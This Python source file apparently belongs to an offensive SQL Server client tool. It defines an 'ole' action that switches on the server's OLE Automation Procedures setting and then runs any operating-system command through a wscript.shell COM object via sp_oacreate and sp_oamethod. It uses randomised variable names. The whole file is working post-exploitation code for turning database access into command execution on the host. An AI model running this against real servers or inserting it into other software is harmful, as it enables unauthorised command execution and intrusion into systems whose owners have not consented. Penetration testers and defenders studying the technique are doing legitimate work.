# mssqlclient_ng/core/actions/execution/ole.py

# Built-in imports

# Third-party imports
from loguru import logger

# Local imports
from ...services.database import DatabaseContext
from ...utils.common import generate_random_string
from ..base import BaseAction, Arg
from ..factory import ActionFactory

@ActionFactory.register(
    "ole",
    "Execute OS commands via OLE Automation (fire-and-forget, no output).",
    aliases=["oamethod"],
)
class ObjectLinkingEmbedding(BaseAction):

    _command = Arg(position=0, remainder=True, required=True, description="OS command to execute")

    def validate_arguments(self, additional_arguments: str = "") -> None:
        self._bind_arguments(additional_arguments)
        logger.info(f"Command to execute: {self._command}")

    def execute(self, database_context: DatabaseContext) -> None:
        """
        Execute the provided command using OLE Automation Procedures.

        This method:
        1. Enables 'Ole Automation Procedures' if disabled
        2. Creates a wscript.shell COM object using sp_oacreate
        3. Executes the command using sp_oamethod
        4. Destroys the COM object using sp_oadestroy

        Args:
            database_context: The database context containing QueryService and ConfigService

        Returns:
            None
        """
        logger.info(f"Executing OLE command: {self._command}")

        # Ensure 'Ole Automation Procedures' are enabled
        if not database_context.config_service.set_configuration_option(
            "Ole Automation Procedures", 1
        ):
            logger.error(
                "Unable to enable Ole Automation Procedures. Ensure you have the necessary permissions."
            )
            return None

        # Generate two random variable names (6 characters each)
        output = generate_random_string(6)
        program = generate_random_string(6)

        # Construct the OLE Automation query
        query = (
            f"DECLARE @{output} INT; "
            f"DECLARE @{program} VARCHAR(255);"
            f"SET @{program} = 'Run(\"{self._command}\")';"
            f"EXEC sp_oacreate 'wscript.shell', @{output} out;"
            f"EXEC sp_oamethod @{output}, @{program};"
            f"EXEC sp_oadestroy @{output};"
        )

        database_context.query_service.execute_non_processing(query)
        logger.success("Executed command")

        return None
